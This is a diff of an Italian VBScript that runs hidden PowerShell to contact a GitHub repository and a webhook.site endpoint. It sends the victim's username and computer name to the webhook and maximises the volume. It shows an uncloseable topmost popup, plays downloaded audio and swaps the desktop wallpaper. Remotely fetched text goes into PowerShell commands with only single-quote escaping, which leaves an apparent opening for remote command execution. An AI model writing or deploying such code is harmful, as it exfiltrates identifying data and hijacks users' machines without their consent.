@@ -2,18 +2,18 @@ Option Explicit
 On Error Resume Next 
 
 ' --- CONFIGURAZIONE --- 
-Dim shell, fso, xmlHttp, i, exec 
+Dim shell, fso, xmlHttp, i 
 Dim urlImmagine1, urlImmagine2, urlImmagine3, urlAudio1, urlAudio2, urlAudio3 
 Dim urlMessaggio, webhookURL 
 Dim messaggioDalWeb, nomeUtente, nomePC 
 Dim scelta1, scelta2, scelta3, sceltaEffettuata 
-' Variabili temporanee per la sanificazione
-Dim msgSafe, s1Safe, s2Safe, s3Safe
+Dim msgSafe, s1Safe, s2Safe, s3Safe 
 
 scelta1 = "Non vedo l'ora!" 
 scelta2 = "" 
 scelta3 = "" 
 
+' Generiamo un timestamp univoco per bypassare la cache
 Dim ts: ts = Timer()
 urlImmagine1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine1.jpg?v=" & ts
 urlImmagine2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/immagine2.jpg?v=" & ts
@@ -21,7 +21,7 @@ urlImmagine3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main
 urlAudio1 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio1.mp3" 
 urlAudio2 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio2.mp3" 
 urlAudio3 = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/audio3.mp3" 
-urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt" 
+urlMessaggio = "https://raw.githubusercontent.com/StangaSquola/RemoteScript/main/messaggio.txt?v=" & ts
 webhookURL = "https://webhook.site/548ae85b-8bc6-42de-a64c-4ffabb6a44d2" 
 
 Set shell = CreateObject("WScript.Shell") 
@@ -31,7 +31,7 @@ nomeUtente = shell.ExpandEnvironmentStrings("%USERNAME%")
 nomePC = shell.ExpandEnvironmentStrings("%COMPUTERNAME%") 
 
 ' --- NOTIFICA AVVIO ---
-InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO", "In attesa"
+InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, "AVVIO SCRIPT", "Connesso"
 
 ' --- DOWNLOAD MESSAGGIO --- 
 Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0") 
@@ -39,51 +39,58 @@ xmlHttp.Open "GET", urlMessaggio, False
 xmlHttp.Send 
 If xmlHttp.Status = 200 Then 
     messaggioDalWeb = Trim(xmlHttp.responseText)
-    ' NOTA: Qui NON facciamo il Replace, lo facciamo solo prima del popup
 End If 
 
 ' --- VOLUME --- 
 shell.SendKeys Chr(&hAD)  
 For i = 1 To 50: shell.SendKeys Chr(&hAF): Next 
 
-' --- PREPARAZIONE POPUP (Sanificazione) ---
-' Creiamo variabili "Safe" solo per PowerShell, lasciando le originali intatte per il confronto finale
+' --- PREPARAZIONE POPUP ---
 msgSafe = Replace(messaggioDalWeb, "'", "''")
 s1Safe = Replace(scelta1, "'", "''")
 s2Safe = Replace(scelta2, "'", "''")
 s3Safe = Replace(scelta3, "'", "''")
 
-' --- POPUP (Versione Robusta) --- 
+' --- POPUP --- 
 If messaggioDalWeb <> "" Then 
-    Dim psPopup 
+    Dim psPopup, tempFile, fileOut
+    tempFile = shell.ExpandEnvironmentStrings("%TEMP%") & "\scelta_" & Replace(CStr(Timer), ",", "") & ".txt"
+
+    ' QUI LA MODIFICA: ControlBox = $false (niente X) ma Size = 420,260 (più alto per vedere i tasti)
     psPopup = "Add-Type -AssemblyName System.Windows.Forms; " & _ 
-               "$f = New-Object Windows.Forms.Form; $f.Text = 'GEA'; $f.Size = '420,220'; " & _ 
-               "$f.StartPosition = 'CenterScreen'; $f.FormBorderStyle = 'FixedDialog'; $f.ControlBox = $false; $f.TopMost = $true; " & _ 
-               "$l = New-Object Windows.Forms.Label; $l.Text = '" & msgSafe & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
-               "$l.Dock = 'Fill'; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
-               "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 60; " & _ 
-               "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; "
+              "$f = New-Object Windows.Forms.Form; $f.Text = 'GEA'; $f.Size = '420,260'; " & _ 
+              "$f.StartPosition = 'CenterScreen'; $f.FormBorderStyle = 'FixedDialog'; $f.ControlBox = $false; $f.TopMost = $true; " & _ 
+              "$l = New-Object Windows.Forms.Label; $l.Text = '" & msgSafe & "'; $l.TextAlign = 'MiddleCenter'; " & _ 
+              "$l.Dock = 'Top'; $l.Height = 150; $l.Font = New-Object Drawing.Font('Segoe UI', 12); $f.Controls.Add($l); " & _ 
+              "$p = New-Object Windows.Forms.FlowLayoutPanel; $p.Dock = 'Bottom'; $p.Height = 70; " & _ 
+              "$p.FlowDirection = 'LeftToRight'; $p.WrapContents = $false; $p.Alignment = 'Center'; " & _
+              "$p.Padding = New-Object Windows.Forms.Padding(10, 10, 0, 0); "
        
-    ' Nota: Qui uso s1Safe per il testo del bottone, ma passo s1Safe anche al risultato
-    ' PowerShell convertirà automaticamente i doppi apici in singoli quando li restituisce.
-    If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & s1Safe & "'; $b1.AutoSize = $true; $b1.Add_Click({$global:res='" & s1Safe & "';$f.Close()}); $p.Controls.Add($b1); " 
-    If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & s2Safe & "'; $b2.AutoSize = $true; $b2.Add_Click({$global:res='" & s2Safe & "';$f.Close()}); $p.Controls.Add($b2); " 
-    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & s3Safe & "'; $b3.AutoSize = $true; $b3.Add_Click({$global:res='" & s3Safe & "';$f.Close()}); $p.Controls.Add($b3); " 
+    If scelta1 <> "" Then psPopup = psPopup & "$b1 = New-Object Windows.Forms.Button; $b1.Text = '" & s1Safe & "'; $b1.AutoSize = $true; $b1.Height=40; $b1.Add_Click({$global:res='" & s1Safe & "';$f.Close()}); $p.Controls.Add($b1); " 
+    If scelta2 <> "" Then psPopup = psPopup & "$b2 = New-Object Windows.Forms.Button; $b2.Text = '" & s2Safe & "'; $b2.AutoSize = $true; $b2.Height=40; $b2.Add_Click({$global:res='" & s2Safe & "';$f.Close()}); $p.Controls.Add($b2); " 
+    If scelta3 <> "" Then psPopup = psPopup & "$b3 = New-Object Windows.Forms.Button; $b3.Text = '" & s3Safe & "'; $b3.AutoSize = $true; $b3.Height=40; $b3.Add_Click({$global:res='" & s3Safe & "';$f.Close()}); $p.Controls.Add($b3); " 
        
+    ' Centratura automatica
     psPopup = psPopup & "$f.Add_Shown({ " & _ 
-               "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
-               "$leftPadding = ($p.Width - $totalWidth) / 2; if($leftPadding -gt 0) { $p.Padding = New-Object Windows.Forms.Padding($leftPadding, 10, 0, 0) } " & _ 
-               "}); " 
-    psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; Write-Output $global:res" 
+              "$totalWidth = 0; foreach($ctrl in $p.Controls) { $totalWidth += $ctrl.Width + $ctrl.Margin.Left + $ctrl.Margin.Right }; " & _ 
+              "$leftPadding = ($p.Width - $totalWidth) / 2; if($leftPadding -gt 0) { $p.Padding = New-Object Windows.Forms.Padding($leftPadding, 15, 0, 0) } " & _ 
+              "}); " 
+              
+    psPopup = psPopup & "$f.Controls.Add($p); $f.ShowDialog() | Out-Null; $global:res | Out-File -FilePath '" & tempFile & "' -Encoding ASCII"
        
-    ' Uso di Chr(34) per gestire correttamente le virgolette esterne
-    ' Rimosso -WindowStyle Hidden che spesso nasconde anche il form
-    Set exec = shell.Exec("powershell -NoProfile -Command " & Chr(34) & psPopup & Chr(34)) 
-    sceltaEffettuata = Replace(Replace(Replace(exec.StdOut.ReadAll(), vbCrLf, ""), vbCr, ""), vbLf, "") 
+    shell.Run "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & psPopup & Chr(34), 0, True 
+    
+    If fso.FileExists(tempFile) Then
+        Set fileOut = fso.OpenTextFile(tempFile, 1)
+        If Not fileOut.AtEndOfStream Then
+            sceltaEffettuata = Trim(Replace(Replace(fileOut.ReadAll(), vbCrLf, ""), vbCr, ""))
+        End If
+        fileOut.Close
+        fso.DeleteFile(tempFile)
+    End If
 End If 
 
-' --- LOGICA --- 
-' Qui usiamo le variabili ORIGINALI (senza doppi apici) perché PowerShell ci restituisce il testo pulito
+' --- LOGICA AZIONI --- 
 Select Case sceltaEffettuata 
     Case scelta1: RiproduciAudio urlAudio1: CambiaFondoDesktop urlImmagine1
     Case scelta2: RiproduciAudio urlAudio2: CambiaFondoDesktop urlImmagine2
@@ -91,16 +98,19 @@ Select Case sceltaEffettuata
 End Select 
 
 ' --- NOTIFICA FINALE --- 
-InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, messaggioDalWeb, sceltaEffettuata 
+Dim msgFinal, sceltaFinal
+msgFinal = Replace(messaggioDalWeb, "'", "''")
+sceltaFinal = Replace(sceltaEffettuata, "'", "''")
+InviaNotificaRemoteWebhook webhookURL, nomeUtente, nomePC, msgFinal, sceltaFinal
 
-' --- FUNZIONI --- (Invariate)
+' --- FUNZIONI ---
+
 Sub RiproduciAudio(urlAudio) 
     Dim p: p = shell.ExpandEnvironmentStrings("%TEMP%") & "\a.mp3" 
     shell.Run "powershell -Command ""(New-Object Net.WebClient).DownloadFile('" & urlAudio & "', '" & p & "')""", 0, True 
 
     If fso.FileExists(p) Then 
-        Dim psCmd
-        psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName PresentationCore; " & _
+        Dim psCmd: psCmd = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName PresentationCore; " & _
                 "$m = New-Object System.Windows.Media.MediaPlayer; " & _
                 "$m.Open('" & p & "'); $m.Play(); Start-Sleep -Seconds 300""" 
         shell.Run psCmd, 0, False 
@@ -108,22 +118,33 @@ Sub RiproduciAudio(urlAudio)
 End Sub
 
 Sub CambiaFondoDesktop(urlImmagine) 
-    Dim imgPath: imgPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\bg_current.jpg" 
-    shell.Run "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('" & urlImmagine & "', '" & imgPath & "')""", 0, True 
-    WScript.Sleep 2000 
-    If fso.FileExists(imgPath) Then 
-        Dim ps: ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "" " & _
-                     "$p = '" & imgPath & "'; " & _
-                     "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $p; " & _
-                     "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\""user32.dll\"", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; " & _
-                     "[W]::SystemParametersInfo(20, 0, $p, 3);"""
-        shell.Run ps, 0, True 
-    End If 
+    Dim psScript
+    psScript = "$url = '" & urlImmagine & "&nocache=' + (Get-Date).Ticks; " & _
+               "$fileName = 'wallpaper_' + (Get-Random) + '.jpg'; " & _
+               "$imgPath = Join-Path $env:TEMP $fileName; " & _
+               "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+               "(New-Object Net.WebClient).DownloadFile($url, $imgPath); " & _
+               "if (Test-Path $imgPath) { " & _
+               "  Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $imgPath; " & _
+               "  Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class W { [DllImport(\""user32.dll\"", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int a, int b, string c, int d); }'; " & _
+               "  [W]::SystemParametersInfo(20, 0, $imgPath, 3); " & _
+               "}"
+
+    shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & psScript & """", 0, True 
 End Sub 
 
 Sub InviaNotificaRemoteWebhook(url, utente, pc, messaggio, scelta) 
-    Dim body: body = "@{ 'utente' = '" & utente & "'; 'pc' = '" & pc & "'; 'scelta' = '" & scelta & "'; 'testo' = '" & messaggio & "' } | ConvertTo-Json"
-    Dim cmd: cmd = "powershell -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
-                   "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body (" & body & ") -ContentType 'application/json'"""
-    shell.Run cmd, 0, True 
+    Dim sUtente, sPc, sMsg, sScelta
+    sUtente = Replace(utente, "'", "''")
+    sPc = Replace(pc, "'", "''")
+    sMsg = Replace(messaggio, "'", "''")
+    sScelta = Replace(scelta, "'", "''")
+
+    Dim psCode
+    psCode = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
+             "$body = @{ utente='" & sUtente & "'; pc='" & sPc & "'; scelta='" & sScelta & "'; testo='" & sMsg & "' }; " & _
+             "$json = $body | ConvertTo-Json -Compress; " & _
+             "Invoke-RestMethod -Uri '" & url & "' -Method Post -Body $json -ContentType 'application/json'"
+
+    shell.Run "powershell -WindowStyle Hidden -Command """ & psCode & """", 0, True 
 End Sub
